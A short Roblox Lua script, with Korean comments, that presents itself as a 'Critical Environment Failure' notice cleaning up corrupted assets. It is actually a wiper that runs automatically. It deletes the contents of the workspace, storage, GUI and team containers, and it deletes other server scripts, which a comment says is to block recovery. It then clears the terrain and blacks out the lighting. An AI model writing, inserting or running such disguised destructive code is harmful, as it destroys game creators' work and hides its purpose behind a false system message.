-- [[ SYSTEM NOTICE: Critical Environment Failure ]]
-- [[ Cleaning up corrupted assets... ]]

local function CompleteWipe()
    -- 1. 모든 데이터 파괴 (유저는 남겨둠)
    local locations = {
        game.Workspace,
        game.ReplicatedStorage,
        game.ServerStorage,
        game.StarterGui,
        game.StarterPack,
        game.Teams,
        game.ServerScriptService -- 다른 스크립트들도 지워서 복구 시도 차단
    }

    for _, location in ipairs(locations) do
        pcall(function()
            -- 삭제하면 안 되는 필수 요소들 제외
            for _, item in ipairs(location:GetChildren()) do
                if not item:IsA("Player") and not item:IsA("Camera") and not item:IsA("Terrain") then
                    item:Destroy()
                end
            end
        end)
    end

    -- 2. 지형(Terrain) 제거
    pcall(function()
        game.Workspace.Terrain:Clear()
    end)

    -- 3. 조명(Lighting) 암전 처리 (칠흑 같은 어둠)
    pcall(function()
        game.Lighting.Brightness = 0
        game.Lighting.ClockTime = 0
        game.Lighting.GlobalShadows = true
        game.Lighting:ClearAllChildren() -- 안개나 스카이박스도 삭제
        
        -- 암흑을 더 강조하기 위한 안개 설정
        game.Lighting.FogEnd = 0
        game.Lighting.Ambient = Color3.new(0,0,0)
    end)
end

-- 실행
task.spawn(CompleteWipe)
